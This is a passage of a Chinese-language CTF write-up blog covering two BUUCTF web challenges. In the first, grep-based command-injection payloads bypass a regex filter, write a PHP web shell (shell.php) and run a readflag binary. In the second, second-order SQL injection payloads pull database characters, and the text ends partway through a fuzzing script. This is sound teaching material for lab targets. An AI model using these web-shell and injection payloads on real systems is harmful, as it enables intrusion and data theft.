class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">//something hide here</span><br><span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-keyword">__FILE__</span>.<span class="hljs-string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>)); <br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&gt;<span class="hljs-number">70</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no, &gt;70&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ å°±ä¸èƒ½ç»•ä¸€ä¸‹å–µ&quot;</span>);<br>&#125;<br> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨grepç›´æ¥è·å–æ–‡ä»¶å®Œæ•´å†…å®¹"><a href="#ä½¿ç”¨grepç›´æ¥è·å–æ–‡ä»¶å®Œæ•´å†…å®¹" class="headerlink" title="ä½¿ç”¨grepç›´æ¥è·å–æ–‡ä»¶å®Œæ•´å†…å®¹:"></a>ä½¿ç”¨grepç›´æ¥è·å–æ–‡ä»¶å®Œæ•´å†…å®¹:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212021144189.png" alt="image-20240212021144189"></p><p><img src="/images/2024-2-18/image-20240212021215290.png" alt="image-20240212021215290"></p><h3 id="ä½¿ç”¨grepåˆ›å»ºæ–°æ–‡ä»¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤-æ„é€ æœ¨é©¬æ–‡ä»¶"><a href="#ä½¿ç”¨grepåˆ›å»ºæ–°æ–‡ä»¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤-æ„é€ æœ¨é©¬æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨grepåˆ›å»ºæ–°æ–‡ä»¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤(æ„é€ æœ¨é©¬æ–‡ä»¶):"></a>ä½¿ç”¨grepåˆ›å»ºæ–°æ–‡ä»¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤(æ„é€ æœ¨é©¬æ–‡ä»¶):</h3><h4 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç”±äºgrepå¯ä»¥åŒ¹é…æ–‡ä»¶çš„è¡Œå†…å®¹ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡&gt;&gt;è¾“å‡ºåˆ°æ–°æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†index.phpä¸­æˆ‘ä»¬æƒ³è¦çš„è¡Œå†…å®¹è¾“å‡ºåˆ°æˆ‘ä»¬æ–°åˆ›å»ºçš„æ–‡ä»¶ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥é¿å¼€preg_match()å‡½æ•°ã€‚<br></code></pre></td></tr></table></figure><h4 id="æˆ‘ä»¬éœ€è¦çš„è¡Œå†…å®¹"><a href="#æˆ‘ä»¬éœ€è¦çš„è¡Œå†…å®¹" class="headerlink" title="æˆ‘ä»¬éœ€è¦çš„è¡Œå†…å®¹:"></a>æˆ‘ä»¬éœ€è¦çš„è¡Œå†…å®¹:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="grepåŒ¹é…è¡Œå†…å®¹è¾“å‡ºåˆ°æˆ‘ä»¬åœ¨ç½‘é¡µå½“å‰ç›®å½•åˆ›å»ºçš„shell-phpæ–‡ä»¶ä¸­"><a href="#grepåŒ¹é…è¡Œå†…å®¹è¾“å‡ºåˆ°æˆ‘ä»¬åœ¨ç½‘é¡µå½“å‰ç›®å½•åˆ›å»ºçš„shell-phpæ–‡ä»¶ä¸­" class="headerlink" title="grepåŒ¹é…è¡Œå†…å®¹è¾“å‡ºåˆ°æˆ‘ä»¬åœ¨ç½‘é¡µå½“å‰ç›®å½•åˆ›å»ºçš„shell.phpæ–‡ä»¶ä¸­:"></a>grepåŒ¹é…è¡Œå†…å®¹è¾“å‡ºåˆ°æˆ‘ä»¬åœ¨ç½‘é¡µå½“å‰ç›®å½•åˆ›å»ºçš„shell.phpæ–‡ä»¶ä¸­:</h4><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h5><p><strong>shell.phpä¸å­˜åœ¨æ—¶ï¼Œå‘½ä»¤è¡Œä¼šè‡ªåŠ¨åˆ›å»º</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;&lt;?php&quot; inde?.ph? &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212013634864.png" alt="image-20240212013634864"></p><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;REQUEST&quot; inde?.ph? &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212013811611.png" alt="image-20240212013811611"></p><p><img src="/images/2024-2-18/image-20240212015115993.png" alt="image-20240212015115993"></p><h5 id="payload3"><a href="#payload3" class="headerlink" title="payload3:"></a>payload3:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;system&quot; inde?.ph? &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212013850597.png" alt="image-20240212013850597"></p><p><img src="/images/2024-2-18/image-20240212015159406.png" alt="image-20240212015159406"></p><h4 id="è®¿é—®shell-php"><a href="#è®¿é—®shell-php" class="headerlink" title="è®¿é—®shell.php:"></a>è®¿é—®shell.php:</h4><p><img src="/images/2024-2-18/image-20240212015224616.png" alt="image-20240212015224616"></p><p>æˆåŠŸè®¿é—®åˆ›å»ºçš„æœ¨é©¬æ–‡ä»¶ï¼ï¼ï¼</p><h3 id="è·å–ç½‘é¡µæŒ‡å®šç›®å½•ä¿¡æ¯"><a href="#è·å–ç½‘é¡µæŒ‡å®šç›®å½•ä¿¡æ¯" class="headerlink" title="è·å–ç½‘é¡µæŒ‡å®šç›®å½•ä¿¡æ¯:"></a>è·å–ç½‘é¡µæŒ‡å®šç›®å½•ä¿¡æ¯:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">shell.php?_[secret.xswl.io=ls ../<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212015414066.png" alt="image-20240212015414066"></p><h3 id="è·å–readflagçš„æ–‡ä»¶å†…å®¹"><a href="#è·å–readflagçš„æ–‡ä»¶å†…å®¹" class="headerlink" title="è·å–readflagçš„æ–‡ä»¶å†…å®¹:"></a>è·å–readflagçš„æ–‡ä»¶å†…å®¹:</h3><h4 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1:"></a>payload1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">shell.php?_[secret.xswl.io=ls ../&#x27;;cat ../readflag&#x27;<br>shell.php?_[secret.xswl.io=ls&#x27;|../readflag&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212020140952.png" alt="image-20240212020140952"></p><h4 id="payload2-1"><a href="#payload2-1" class="headerlink" title="payload2:"></a>payload2:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">shell.php?_[secret.xswl.io=grep &quot;&quot; ../readflag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212020614372.png" alt="image-20240212020614372"></p><p><img src="/images/2024-2-18/image-20240212020420020.png" alt="image-20240212020420020"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[ç½‘é¼æ¯2018]Unfinish</title>
    <link href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DUnfinish/"/>
    <url>/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DUnfinish/</url>
    
    <content type="html"><![CDATA[<h1 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p>[<a href="https://blog.csdn.net/fmyyy1/article/details/115733073">ç½‘é¼æ¯2018]Unfinish_[ç½‘é¼æ¯2018]unfinish 1-CSDNåšå®¢</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240215135032954.png" alt="image-20240215135032954"></p><p>å‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸€ä¸‹ç½‘é¡µå­˜åœ¨æ³¨å†Œç•Œé¢register.php</p><h2 id="è®¿é—®æ³¨å†Œç•Œé¢"><a href="#è®¿é—®æ³¨å†Œç•Œé¢" class="headerlink" title="è®¿é—®æ³¨å†Œç•Œé¢:"></a>è®¿é—®æ³¨å†Œç•Œé¢:</h2><p><img src="/images/2024-2-18/image-20240215135656875.png" alt="image-20240215135656875"></p><h2 id="éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·"><a href="#éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·" class="headerlink" title="éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·:"></a>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>email=123@qq.com<br>&amp;username=south<br>&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215140010757.png" alt="image-20240215140010757"></p><h2 id="ä½¿ç”¨æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·ç™»å½•ä¸€ä¸‹"><a href="#ä½¿ç”¨æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·ç™»å½•ä¸€ä¸‹" class="headerlink" title="ä½¿ç”¨æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·ç™»å½•ä¸€ä¸‹:"></a>ä½¿ç”¨æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·ç™»å½•ä¸€ä¸‹:</h2><p><img src="/images/2024-2-18/image-20240215140144979.png" alt="image-20240215140144979"></p><p><img src="/images/2024-2-18/image-20240215140221093.png" alt="image-20240215140221093"></p><p>æˆ‘ä»¬è¿›å…¥äº†index.phpç•Œé¢ã€‚</p><h3 id="ç‚¹å‡»å·¦ä¸Šè§’ç®­å¤´"><a href="#ç‚¹å‡»å·¦ä¸Šè§’ç®­å¤´" class="headerlink" title="ç‚¹å‡»å·¦ä¸Šè§’ç®­å¤´:"></a>ç‚¹å‡»å·¦ä¸Šè§’ç®­å¤´:</h3><p><img src="/images/2024-2-18/image-20240215141631501.png" alt="image-20240215141631501"></p><p>å‘ç°æ˜¾ç¤ºäº†æˆ‘ä»¬æ³¨å†Œç”¨çš„ç”¨æˆ·åä»¥åŠå›¾ç‰‡</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç”¨æˆ·åæ˜¯æˆ‘ä»¬çš„å¯æ§ç‚¹ï¼Œè¿™é‡Œç½‘é¡µæ˜¾ç¤ºçš„ç”¨æˆ·åå¾ˆæœ‰å¯èƒ½æ˜¯ä»æ•°æ®åº“ä¸­æå–å‡ºæ¥çš„ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥<br></code></pre></td></tr></table></figure><h2 id="æµ‹è¯•ç½‘é¡µæ˜¯å¦å­˜åœ¨äºŒæ¬¡æ³¨å…¥"><a href="#æµ‹è¯•ç½‘é¡µæ˜¯å¦å­˜åœ¨äºŒæ¬¡æ³¨å…¥" class="headerlink" title="æµ‹è¯•ç½‘é¡µæ˜¯å¦å­˜åœ¨äºŒæ¬¡æ³¨å…¥:"></a>æµ‹è¯•ç½‘é¡µæ˜¯å¦å­˜åœ¨äºŒæ¬¡æ³¨å…¥:</h2><h3 id="çŒœæµ‹äºŒæ¬¡æ³¨å…¥çš„sqlè¯­å¥"><a href="#çŒœæµ‹äºŒæ¬¡æ³¨å…¥çš„sqlè¯­å¥" class="headerlink" title="çŒœæµ‹äºŒæ¬¡æ³¨å…¥çš„sqlè¯­å¥:"></a>çŒœæµ‹äºŒæ¬¡æ³¨å…¥çš„sqlè¯­å¥:</h3><h4 id="insert"><a href="#insert" class="headerlink" title="insert:"></a>insert:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into user set values(&#x27;123@qq.com&#x27;,&#x27;south&#x27;,&#x27;123&#x27;)<br></code></pre></td></tr></table></figure><h3 id="æµ‹è¯•payload"><a href="#æµ‹è¯•payload" class="headerlink" title="æµ‹è¯•payload:"></a>æµ‹è¯•payload:</h3><p><strong>ç”±äºusernameä¸ºäºŒæ¬¡æ³¨å…¥çš„å†æ¬¡å›æ˜¾ç‚¹ï¼Œæ‰€ä»¥è¦åˆ©ç”¨usernameè¿›è¡Œæ³¨å…¥</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=123@qq.com<br>&amp;username=1&#x27; and &#x27;0<br>&amp;password=123<br></code></pre></td></tr></table></figure><h3 id="æ„é€ å‡ºæ¥çš„sqlè¯­å¥"><a href="#æ„é€ å‡ºæ¥çš„sqlè¯­å¥" class="headerlink" title="æ„é€ å‡ºæ¥çš„sqlè¯­å¥:"></a>æ„é€ å‡ºæ¥çš„sqlè¯­å¥:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into user values(&#x27;123@qq.com&#x27;,&#x27;1&#x27; and &#x27;0&#x27;,&#x27;123&#x27;)<br>&lt;=&gt;<br>insert into user values(&#x27;123@qq.com&#x27;,0,&#x27;123&#x27;)<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æœ¬åœ°æ•°æ®åº“æµ‹è¯•æˆ‘ä»¬çš„payload"><a href="#ä½¿ç”¨æœ¬åœ°æ•°æ®åº“æµ‹è¯•æˆ‘ä»¬çš„payload" class="headerlink" title="ä½¿ç”¨æœ¬åœ°æ•°æ®åº“æµ‹è¯•æˆ‘ä»¬çš„payload:"></a>ä½¿ç”¨æœ¬åœ°æ•°æ®åº“æµ‹è¯•æˆ‘ä»¬çš„payload:</h3><p><img src="/images/2024-2-18/image-20240215144025756.png" alt="image-20240215144025756"></p><h3 id="é‡æ–°æ³¨å†Œæˆ‘ä»¬çš„ä¿¡æ¯ï¼Œæ’å…¥æˆ‘ä»¬çš„payload"><a href="#é‡æ–°æ³¨å†Œæˆ‘ä»¬çš„ä¿¡æ¯ï¼Œæ’å…¥æˆ‘ä»¬çš„payload" class="headerlink" title="é‡æ–°æ³¨å†Œæˆ‘ä»¬çš„ä¿¡æ¯ï¼Œæ’å…¥æˆ‘ä»¬çš„payload:"></a>é‡æ–°æ³¨å†Œæˆ‘ä»¬çš„ä¿¡æ¯ï¼Œæ’å…¥æˆ‘ä»¬çš„payload:</h3><p>ç”±äºè¯¥ç½‘é¡µç»è¿‡æµ‹è¯•ï¼Œä¸æ˜¯åœ¨åŸæ¥çš„ç”¨æˆ·ä¸Šè¿›è¡Œä¿¡æ¯æ›´æ–°ï¼Œæ¯æ¬¡æ³¨å†Œéƒ½æ˜¯äº§ç”Ÿä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¦‚æœç”¨é‡å¤çš„é‚®ç®±æ³¨å†Œï¼Œå›æ˜¾çš„è¿˜æ˜¯ä¸€å¼€å§‹æ³¨å†Œé‚®ç®±çš„ç”¨æˆ·åä¿¡æ¯ã€‚</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=1234@qq.com<br>&amp;username=1&#x27; and &#x27;0<br>&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215144444133.png" alt="image-20240215144444133"></p><h4 id="index-phpæ˜¾ç¤ºç»“æœ"><a href="#index-phpæ˜¾ç¤ºç»“æœ" class="headerlink" title="index.phpæ˜¾ç¤ºç»“æœ:"></a>index.phpæ˜¾ç¤ºç»“æœ:</h4><p><img src="/images/2024-2-18/image-20240215144501494.png" alt="image-20240215144501494"></p><p>ç”¨æˆ·åæ˜¾ç¤ºçš„ä¿¡æ¯ä¸º0ï¼Œæ‰€ä»¥è¯¥ç½‘é¡µå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><h2 id="æ„é€ äºŒæ¬¡æ³¨å…¥çš„payload"><a href="#æ„é€ äºŒæ¬¡æ³¨å…¥çš„payload" class="headerlink" title="æ„é€ äºŒæ¬¡æ³¨å…¥çš„payload:"></a>æ„é€ äºŒæ¬¡æ³¨å…¥çš„payload:</h2><h3 id="ä»insertè¯­å¥ä¸­åˆ†æ"><a href="#ä»insertè¯­å¥ä¸­åˆ†æ" class="headerlink" title="ä»insertè¯­å¥ä¸­åˆ†æ:"></a>ä»insertè¯­å¥ä¸­åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into user values(&#x27;xxx&#x27;,&#x27;yyy&#x27;,&#x27;123&#x27;)<br>=&gt;<br>xxx=12345@qq.com&#x27;,database(),&#x27;123&#x27;);/*<br>=&gt;<br>insert into user values(&#x27;12345@qq.com&#x27;,database(),&#x27;123&#x27;);/*&#x27;,&#x27;yyy&#x27;,&#x27;123&#x27;)<br></code></pre></td></tr></table></figure><h4 id="æœ¬åœ°æµ‹è¯•sqlè¯­å¥"><a href="#æœ¬åœ°æµ‹è¯•sqlè¯­å¥" class="headerlink" title="æœ¬åœ°æµ‹è¯•sqlè¯­å¥:"></a>æœ¬åœ°æµ‹è¯•sqlè¯­å¥:</h4><p><img src="/images/2024-2-18/image-20240215145954465.png" alt="image-20240215145954465"></p><h3 id="ä¸Šä¼ æˆ‘ä»¬çš„payload"><a href="#ä¸Šä¼ æˆ‘ä»¬çš„payload" class="headerlink" title="ä¸Šä¼ æˆ‘ä»¬çš„payload:"></a>ä¸Šä¼ æˆ‘ä»¬çš„payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=2@qq.com&#x27;,database(),&#x27;123&#x27;);/*&amp;username=south&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215150524978.png" alt="image-20240215150524978"></p><p><img src="/images/2024-2-18/image-20240215150601141.png" alt="image-20240215150601141"></p><p>æ³¨å†Œäº†ï¼Œä½†æ˜¯æ²¡æ³•ç™»å½•ï¼Œemmmm,å°è¯•äº†å¾ˆå¤šæ¬¡ä¹Ÿæ²¡ç”¨ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è‡ªå·±çš„æ–¹å¼é”™äº†ï¼Œæ‰€ä»¥å‚è€ƒå¤§ä½¬çš„wpåœ¨æ˜¾ç¤ºç‚¹usernameä¸Šç›´æ¥æ³¨å…¥ã€‚</p><h2 id="äºŒæ¬¡æ³¨å…¥åœ¨æ˜¾ç¤ºç‚¹ä¸Šç›´æ¥å†™å…¥æ³¨å…¥payload"><a href="#äºŒæ¬¡æ³¨å…¥åœ¨æ˜¾ç¤ºç‚¹ä¸Šç›´æ¥å†™å…¥æ³¨å…¥payload" class="headerlink" title="äºŒæ¬¡æ³¨å…¥åœ¨æ˜¾ç¤ºç‚¹ä¸Šç›´æ¥å†™å…¥æ³¨å…¥payload:"></a>äºŒæ¬¡æ³¨å…¥åœ¨æ˜¾ç¤ºç‚¹ä¸Šç›´æ¥å†™å…¥æ³¨å…¥payload:</h2><h3 id="ç¬¬ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨è„šæœ¬çˆ†ç ´"><a href="#ç¬¬ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨è„šæœ¬çˆ†ç ´" class="headerlink" title="ç¬¬ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨è„šæœ¬çˆ†ç ´:"></a>ç¬¬ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨è„šæœ¬çˆ†ç ´:</h3><p><strong>è¿™é‡Œéœ€è¦ç”¨åˆ°â€™+â€™,è¯¥ç¬¦å·åœ¨mysqlä¸­ä¸ºè¿ç®—ç¬¦ï¼Œä¸ä½œä¸ºå­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œä½¿ç”¨è¯¥ç¬¦å·æ˜¯ä¸ºäº†ç”¨äºé—­åˆå·¦å³å•å¼•å·</strong></p><h3 id="æœ¬åœ°æµ‹è¯•ä½¿ç”¨"><a href="#æœ¬åœ°æµ‹è¯•ä½¿ç”¨" class="headerlink" title="æœ¬åœ°æµ‹è¯•ä½¿ç”¨:"></a>æœ¬åœ°æµ‹è¯•ä½¿ç”¨:</h3><h4 id="sql1"><a href="#sql1" class="headerlink" title="sql1:"></a>sql1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select &#x27;1&#x27;+&#x27;2&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215151846840.png" alt="image-20240215151846840"></p><h4 id="sql2"><a href="#sql2" class="headerlink" title="sql2:"></a>sql2:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select &#x27;0&#x27;+ascii(substr(database(),1,1));<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152023562.png" alt="image-20240215152023562"></p><p>è¿™é‡Œç›´æ¥å›æ˜¾å‡ºäº†æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç å€¼ã€‚</p><h4 id="sql3"><a href="#sql3" class="headerlink" title="sql3:"></a>sql3:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select &#x27;0&#x27;+ascii(substr(database(),1,1))+&#x27;0&#x27;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152207479.png" alt="image-20240215152207479"></p><h4 id="sql4"><a href="#sql4" class="headerlink" title="sql4:"></a>sql4:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">INSERT into beanpublisher VALUES (&#x27;5&#x27;,&#x27;0&#x27;+ascii(substr(database(),1,1))+&#x27;0&#x27;,&#x27;123&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152400749.png" alt="image-20240215152400749"></p><h3 id="payloadæ„é€ "><a href="#payloadæ„é€ " class="headerlink" title="payloadæ„é€ :"></a>payloadæ„é€ :</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=1235@qq.com<br>&amp;username=0&#x27;+ascii(substr(database(),1,1))+&#x27;0<br>&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215152531014.png" alt="image-20240215152531014"></p><p>å‘ç°æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆè¦å¯»æ‰¾å®ƒè¿‡æ»¤çš„å†…å®¹ã€‚</p><h3 id="fuzz-py"><a href="#fuzz-py" class="headerlink" title="fuzz.py:"></a>fuzz.py:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list = []<br>white_list = []<br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://06d52d1b-c47b-46df-9d12-1d45cfcca5bd.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = 